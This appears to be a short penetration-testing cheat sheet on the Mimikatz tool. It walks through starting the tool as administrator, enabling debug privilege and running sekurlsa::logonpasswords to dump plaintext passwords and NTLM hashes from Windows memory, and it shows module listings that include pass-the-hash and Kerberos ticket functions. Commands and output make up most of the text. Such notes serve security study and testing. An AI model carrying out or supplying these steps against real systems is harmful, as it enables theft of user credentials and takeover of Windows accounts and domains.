# Mimikatz Overview & Credential Dumping
> 29.07.2024

---

https://github.com/gentilkiwi/mimikatz
## Overview
- Tool used to view and steal credentials, generate Kerberos tickets, and leverage attacks
- Dump credentials stored in memory
- Credential Dumping, Pass-The-Hash, Over-Pass-The-Hash, Pass-The-Ticket, Silver Ticket, Golden Ticket, etc.
##  Credential Dumping

**Start up mimikatz with local administrative privilege:**
```powershell
.\mimikatz.exe
```

**List privileges:**
```powershell
privilege::

Module :        privilege
Full name :     Privilege module

           debug  -  Ask debug privilege
          driver  -  Ask load driver privilege
        security  -  Ask security privilege
             tcb  -  Ask tcb privilege
          backup  -  Ask backup privilege
         restore  -  Ask restore privilege
          sysenv  -  Ask system environment privilege
              id  -  Ask a privilege by its id
            name  -  Ask a privilege by its name
```

**Enable debug privilege:**
```powershell
privilege::debug

Privilege '20' OK
```

**Module: sekurlsa:**
```powershell
sekurlsa::

Module :        sekurlsa
Full name :     SekurLSA module
Description :   Some commands to enumerate credentials...

             msv  -  Lists LM & NTLM credentials
         wdigest  -  Lists WDigest credentials
        kerberos  -  Lists Kerberos credentials
           tspkg  -  Lists TsPkg credentials
         livessp  -  Lists LiveSSP credentials
         cloudap  -  Lists CloudAp credentials
             ssp  -  Lists SSP credentials
  logonPasswords  -  Lists all available providers credentials
         process  -  Switch (or reinit) to LSASS process  context
        minidump  -  Switch (or reinit) to LSASS minidump context
         bootkey  -  Set the SecureKernel Boot Key to attempt to decrypt LSA Isolated credentials
             pth  -  Pass-the-hash
          krbtgt  -  krbtgt!
     dpapisystem  -  DPAPI_SYSTEM secret
           trust  -  Antisocial
      backupkeys  -  Preferred Backup Master keys
         tickets  -  List Kerberos tickets
           ekeys  -  List Kerberos Encryption Keys
           dpapi  -  List Cached MasterKeys
         credman  -  List Credentials Manager
```

**Dump password / ntlm-hash from memory:**
```powershell
sekurlsa::logonpasswords
```
